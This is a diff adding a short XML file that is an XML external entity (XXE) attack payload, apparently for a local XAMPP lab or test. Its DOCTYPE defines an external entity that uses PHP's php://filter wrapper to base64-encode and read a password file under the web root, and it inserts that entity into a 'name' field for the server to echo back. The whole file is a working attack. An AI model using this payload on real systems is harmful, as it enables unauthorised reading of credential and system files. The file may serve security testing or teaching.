@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE replace [<!ENTITY blablabla SYSTEM "php://filter/convert.base64-encode/resource=C:/xampp/htdocs/password.txt"> ]>
+
+<root>
+<name>
+&blablabla;
+</name>
+<password>safasfas</password>
+</root>>
+
+
+
